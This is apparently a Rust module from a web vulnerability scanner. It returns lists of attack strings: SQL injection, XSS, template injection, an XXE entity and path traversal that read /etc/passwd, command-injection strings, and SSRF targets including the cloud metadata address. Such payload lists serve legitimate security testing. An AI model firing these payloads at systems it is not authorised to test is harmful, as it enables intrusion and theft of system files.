// Payload sets from MONOLITH vulnerable.py

pub struct Payloads;

impl Payloads {
    pub fn sqli() -> Vec<&'static str> {
        vec![
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "admin' --",
            "' OR 1=1 --",
            "UNION SELECT NULL,NULL,NULL --",
            "UNION SELECT username, password FROM users --",
        ]
    }

    pub fn xss() -> Vec<&'static str> {
        vec![
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
        ]
    }

    pub fn ssti() -> Vec<&'static str> {
        vec![
            "{{ 7 * 7 }}",
            "${7*7}",
            "<%= 7 * 7 %>",
            "{{config}}",
            "{{7*7}}",
        ]
    }

    pub fn xxe() -> Vec<&'static str> {
        vec![
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
        ]
    }

    pub fn command_injection() -> Vec<&'static str> {
        vec![
            "; whoami",
            "&& whoami",
            "| whoami",
            "; cat /etc/passwd",
            "`id`",
            "$(id)",
        ]
    }

    pub fn ssrf() -> Vec<&'static str> {
        vec![
            "http://localhost",
            "http://127.0.0.1",
            "http://169.254.169.254",
            "file:///etc/passwd",
        ]
    }

    pub fn path_traversal() -> Vec<&'static str> {
        vec![
            "../",
            "../../",
            "../../../../etc/passwd",
            "..%2F",
        ]
    }
}
